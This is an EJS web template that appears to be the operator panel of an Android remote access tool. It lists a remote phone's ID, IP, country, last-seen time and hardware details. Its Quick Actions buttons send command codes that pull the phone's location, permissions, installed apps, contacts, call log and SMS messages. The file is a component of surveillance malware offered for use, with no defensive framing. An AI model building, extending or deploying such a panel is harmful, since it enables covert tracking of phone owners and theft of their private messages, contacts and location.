<% const c = data.client || {}; const conn = c.connection || {}; const di = data.deviceInfo || c.device || {}; %>
<div class="card">
    <div class="card-header">
        <h2>Device Information</h2>
        <button class="btn primary" onclick="refreshDeviceInfo()">🔄 Refresh</button>
    </div>
    <div class="info-grid">
        <div class="info-item"><label>Device ID</label><code><%= c.id || '—' %></code></div>
        <div class="info-item"><label>Status</label><span class="badge <%= conn.online ? 'success' : 'error' %>"><%= conn.online ? 'Online' : 'Offline' %></span></div>
        <div class="info-item"><label>Brand</label><span><%= di?.brand || c.device?.brand || '—' %></span></div>
        <div class="info-item"><label>Model</label><span><%= di?.model || c.device?.model || '—' %></span></div>
        <div class="info-item"><label>Device</label><span><%= di?.device || '—' %></span></div>
        <div class="info-item"><label>Manufacturer</label><span><%= di?.manufacturer || '—' %></span></div>
        <div class="info-item"><label>Android</label><span><%= di?.androidVersion || c.device?.version || di?.version || '—' %></span></div>
        <div class="info-item"><label>SDK Level</label><span><%= di?.sdkLevel || '—' %></span></div>
        <div class="info-item"><label>Security Patch</label><span><%= di?.securityPatch || '—' %></span></div>
        <div class="info-item"><label>IP</label><code><%= conn.ip || '—' %></code></div>
        <div class="info-item"><label>Country</label><span><%= conn.country || '—' %></span></div>
        <div class="info-item"><label>First Seen</label><span><%= conn.firstSeen ? new Date(conn.firstSeen).toLocaleString() : '—' %></span></div>
        <div class="info-item"><label>Last Seen</label><span><%= conn.lastSeen ? new Date(conn.lastSeen).toLocaleString() : '—' %></span></div>
    </div>
</div>
<% if (di) { %>
<div class="card">
    <div class="card-header"><h2>📊 System Status</h2></div>
    <div class="info-grid">
        <% if (di.battery) { %>
            <div class="info-item"><label>Battery</label><span><%= di.battery.level %>% <%= di.battery.charging ? '⚡' : '' %></span></div>
            <div class="info-item"><label>Battery Status</label><span class="badge <%= di.battery.charging ? 'success' : '' %>"><%= di.battery.status || '—' %></span></div>
        <% } %>
        <% if (di.memory) { %>
            <div class="info-item"><label>RAM Total</label><span><%= di.memory.total || '—' %></span></div>
            <div class="info-item"><label>RAM Used</label><span><%= di.memory.used %> (<%= di.memory.usedPercent %>%)</span></div>
            <div class="info-item"><label>RAM Available</label><span><%= di.memory.available || '—' %></span></div>
            <% if (di.memory.lowMemory) { %>
            <div class="info-item"><label>Memory</label><span class="badge error">Low Memory</span></div>
            <% } %>
        <% } %>
        <% if (di.storage) { %>
            <div class="info-item"><label>Storage Total</label><span><%= di.storage.internalTotal || '—' %></span></div>
            <div class="info-item"><label>Storage Used</label><span><%= di.storage.internalUsed %> (<%= di.storage.internalUsedPercent %>%)</span></div>
            <div class="info-item"><label>Storage Free</label><span><%= di.storage.internalFree || '—' %></span></div>
            <% if (di.storage.hasSdCard) { %>
            <div class="info-item"><label>SD Card</label><span class="badge success">Present</span></div>
            <% } %>
        <% } %>
    </div>
</div>
<div class="card">
    <div class="card-header"><h2>🌐 Network & Screen</h2></div>
    <div class="info-grid">
        <% if (di.network) { %>
            <div class="info-item"><label>Network</label><span class="badge <%= di.network.connected ? 'success' : 'error' %>"><%= di.network.connected ? 'Connected' : 'Offline' %></span></div>
            <% if (di.network.connected) { %>
            <div class="info-item"><label>Network Type</label><span><%= di.network.type || '—' %></span></div>
            <% } %>
        <% } %>
        <% if (di.phone) { %>
            <div class="info-item"><label>Carrier</label><span><%= di.phone.networkOperatorName || '—' %></span></div>
            <div class="info-item"><label>Network Type</label><span><%= di.phone.networkType || '—' %></span></div>
            <div class="info-item"><label>Phone Type</label><span><%= di.phone.phoneType || '—' %></span></div>
        <% } %>
        <% if (di.screen) { %>
            <div class="info-item"><label>Screen</label><span><%= di.screen.width %>x<%= di.screen.height %></span></div>
            <div class="info-item"><label>Density</label><span><%= di.screen.densityDpi %> dpi</span></div>
        <% } %>
    </div>
</div>
<% } %>
<div class="card">
    <div class="card-header"><h2>Quick Actions</h2></div>
    <div class="btn-group">
        <button class="btn" onclick="sendCmd('0xLO')">📍 Location</button>
        <button class="btn" onclick="sendCmd('0xPM')">🔐 Permissions</button>
        <button class="btn" onclick="sendCmd('0xIN', {sys: false})">📦 Apps</button>
        <button class="btn" onclick="sendCmd('0xCO')">👥 Contacts</button>
        <button class="btn" onclick="sendCmd('0xCL')">📞 Calls</button>
        <button class="btn" onclick="sendCmd('0xSM', {action: 'ls'})">💬 SMS</button>
    </div>
</div>
